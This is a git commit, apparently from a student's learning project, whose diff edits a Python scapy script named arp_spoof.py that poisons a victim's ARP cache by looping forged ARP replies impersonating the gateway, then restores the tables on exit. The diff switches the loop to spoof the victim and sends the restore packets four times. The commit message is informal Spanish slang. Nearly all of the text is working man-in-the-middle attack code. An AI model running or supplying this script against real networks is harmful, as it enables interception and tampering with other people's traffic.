41a9b6a92030973780419acf49d0433d876e8081
vatojavier <antonioj.casado@estudiante.uam.es>
2019-02-26 22:57:14 +0100

    yo k se macho

--- arp_spoof.py
+++ arp_spoof.py
@@ -12,6 +12,7 @@ def get_mac(ip):
     #take the fist [0]->(only) packet [1]->target info.hwsrc
     return ans[0][1].hwsrc
 
+
 #(target_ip=victim, spoof_ip=who i pretend)
 def spoof_target(target_ip,target_mac, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip )
@@ -23,8 +24,8 @@ def reArp(victim_ip,victim_mac, gateway_ip,gateway_mac):
     packetV = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac)
     #says router that victi  is at victim mac
     packetR = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac)
-    scapy.send(packetV)
-    scapy.send(packetR)
+    scapy.send(packetV,count=4)
+    scapy.send(packetR,count=4)
 
 
 
@@ -36,13 +37,12 @@ victim_mac = get_mac(victim_ip)#get mac of victim
 gtw_mac    = get_mac(gtw_ip)#get mac of gtw
 print("victim " + victim_ip + " with MAC " + victim_mac)
 print("Router " + gtw_ip + " with MAC " + gtw_mac)
-#spoof them, this way only request for mac once each
 packets_count = 0
 
 try:
     while True:
-        #spoof_target(victim_ip,victim_mac,gtw_ip)
-        spoof_target(gtw_ip,gtw_mac,victim_ip)#spoofing the gw make it wont work!?
+        spoof_target(victim_ip,victim_mac,gtw_ip)
+        #spoof_target(gtw_ip,gtw_mac,victim_ip)#spoofing the gw make it wont work!?
         packets_count = packets_count + 1
         print("\rPackets sent: " + str(packets_count), end="")
         time.sleep(2)
